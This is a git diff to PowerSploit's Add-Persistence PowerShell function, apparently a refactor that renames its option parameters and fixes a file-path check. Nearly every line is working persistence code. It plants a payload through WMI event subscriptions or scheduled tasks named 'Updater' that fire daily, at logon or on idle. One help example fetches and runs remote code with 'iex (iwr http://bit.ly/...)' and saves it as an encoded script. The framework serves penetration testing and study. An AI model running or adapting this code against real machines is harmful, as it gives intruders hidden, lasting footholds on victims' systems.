@@ -8,7 +8,7 @@ function Add-Persistence
     PowerSploit Function: Add-Persistence
     Author: Matthew Graeber (@mattifestation)
     License: BSD 3-Clause
-    Required Dependencies: New-ElevatedPersistenceOptions, New-UserPersistenceOptions
+    Required Dependencies: New-ElevatedPersistenceOption, New-UserPersistenceOption
     Optional Dependencies: None
  
 .DESCRIPTION
@@ -23,15 +23,15 @@ function Add-Persistence
 
     Specifies the path to your payload.
 
-.PARAMETER ElevatedPersistenceOptions
+.PARAMETER ElevatedPersistenceOption
 
     Specifies the trigger for the persistent payload if the target is running elevated.
-    You must run New-ElevatedPersistenceOptions to generate this argument.
+    You must run New-ElevatedPersistenceOption to generate this argument.
 
-.PARAMETER UserPersistenceOptions
+.PARAMETER UserPersistenceOption
 
     Specifies the trigger for the persistent payload if the target is not running elevated.
-    You must run New-UserPersistenceOptions to generate this argument.
+    You must run New-UserPersistenceOption to generate this argument.
 
 .PARAMETER PersistenceScriptName
 
@@ -71,9 +71,9 @@ function Add-Persistence
 
 .EXAMPLE
 
-    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOptions -PermanentWMI -Daily -At '3 PM'
-    C:\PS>$UserOptions = New-UserPersistenceOptions -Registry -AtLogon
-    C:\PS>Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOptions $ElevatedOptions -UserPersistenceOptions $UserOptions -Verbose
+    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
+    C:\PS>$UserOptions = New-UserPersistenceOption -Registry -AtLogon
+    C:\PS>Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
 
     Description
     -----------
@@ -82,9 +82,9 @@ function Add-Persistence
 .EXAMPLE
 
     C:\PS>$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
-    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOptions -ScheduledTask -OnIdle
-    C:\PS>$UserOptions = New-UserPersistenceOptions -ScheduledTask -OnIdle
-    C:\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOptions $ElevatedOptions -UserPersistenceOptions $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1
+    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
+    C:\PS>$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
+    C:\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1
 
     Description
     -----------
@@ -108,10 +108,10 @@ function Add-Persistence
         $FilePath,
 
         [Parameter( Mandatory = $True )]
-        $ElevatedPersistenceOptions,
+        $ElevatedPersistenceOption,
 
         [Parameter( Mandatory = $True )]
-        $UserPersistenceOptions,
+        $UserPersistenceOption,
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -136,12 +136,12 @@ function Add-Persistence
 
 #region Validate arguments
 
-    if ($ElevatedPersistenceOptions.PSObject.TypeNames[0] -ne 'PowerSploit.Persistence.ElevatedPersistenceOptions')
+    if ($ElevatedPersistenceOption.PSObject.TypeNames[0] -ne 'PowerSploit.Persistence.ElevatedPersistenceOption')
     {
         throw 'You provided invalid elevated persistence options.'
     }
 
-    if ($UserPersistenceOptions.PSObject.TypeNames[0] -ne 'PowerSploit.Persistence.UserPersistenceOptions')
+    if ($UserPersistenceOption.PSObject.TypeNames[0] -ne 'PowerSploit.Persistence.UserPersistenceOption')
     {
         throw 'You provided invalid user-level persistence options.'
     }
@@ -171,9 +171,9 @@ function Add-Persistence
         $RemovalScriptFile = "$($Path)\$($Leaf)"
     }
 
-    if ($PSBoundParameters['Path'])
+    if ($PSBoundParameters['FilePath'])
     {
-        Get-ChildItem $Path -ErrorAction Stop | Out-Null
+        Get-ChildItem $FilePath -ErrorAction Stop
         $Script = [IO.File]::ReadAllText((Resolve-Path $Path))
     }
     else
@@ -216,7 +216,7 @@ function Add-Persistence
 #region Process persistence options
 
     # Begin processing elevated persistence options
-    switch ($ElevatedPersistenceOptions.Method)
+    switch ($ElevatedPersistenceOption.Method)
     {
         'PermanentWMI'
         {
@@ -226,7 +226,7 @@ Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "nam
 Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'Updater'} | Remove-WmiObject
             }
 
-            switch ($ElevatedPersistenceOptions.Trigger)
+            switch ($ElevatedPersistenceOption.Trigger)
             {
                 'AtStartup'
                 {
@@ -235,7 +235,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
 
                 'Daily'
                 {
-                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ElevatedPersistenceOptions.Time.ToString('HH')) AND TargetInstance.Minute = $($ElevatedPersistenceOptions.Time.ToString('mm')) GROUP WITHIN 60```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
+                    $ElevatedTrigger = "`"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```"root\subscription```" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage=```"WQL```";Query=```"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ElevatedPersistenceOption.Time.ToString('HH')) AND TargetInstance.Minute = $($ElevatedPersistenceOption.Time.ToString('mm')) GROUP WITHIN 60```"};```$Consumer=Set-WmiInstance -Namespace ```"root\subscription```" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate=```"```$(```$Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive```";RunInteractively='false'};Set-WmiInstance -Namespace ```"root\subscription```" -Class __FilterToConsumerBinding -Arguments @{Filter=```$Filter;Consumer=```$Consumer} | Out-Null`""
                 }
 
                 default
@@ -250,7 +250,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
             $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
             $ElevatedTriggerRemoval = "schtasks /Delete /TN Updater"
 
-            switch ($ElevatedPersistenceOptions.Trigger)
+            switch ($ElevatedPersistenceOption.Trigger)
             {
                 'AtLogon'
                 {
@@ -259,7 +259,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
                 
                 'Daily'
                 {
-                    $ElevatedTrigger = "schtasks /Create /RU system /SC DAILY /ST $($ElevatedPersistenceOptions.Time.ToString('HH:mm:ss')) /TN Updater /TR "
+                    $ElevatedTrigger = "schtasks /Create /RU system /SC DAILY /ST $($ElevatedPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
                 }
 
                 'OnIdle'
@@ -291,18 +291,18 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
     }
 
     # Begin processing user-level persistence options
-    switch ($UserPersistenceOptions.Method)
+    switch ($UserPersistenceOption.Method)
     {
         'ScheduledTask'
         {
             $CommandLine = '`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`"'
             $UserTriggerRemoval = "schtasks /Delete /TN Updater"
 
-            switch ($UserPersistenceOptions.Trigger)
+            switch ($UserPersistenceOption.Trigger)
             {
                 'Daily'
                 {
-                    $UserTrigger = "schtasks /Create /SC DAILY /ST $($UserPersistenceOptions.Time.ToString('HH:mm:ss')) /TN Updater /TR "
+                    $UserTrigger = "schtasks /Create /SC DAILY /ST $($UserPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
                 }
 
                 'OnIdle'
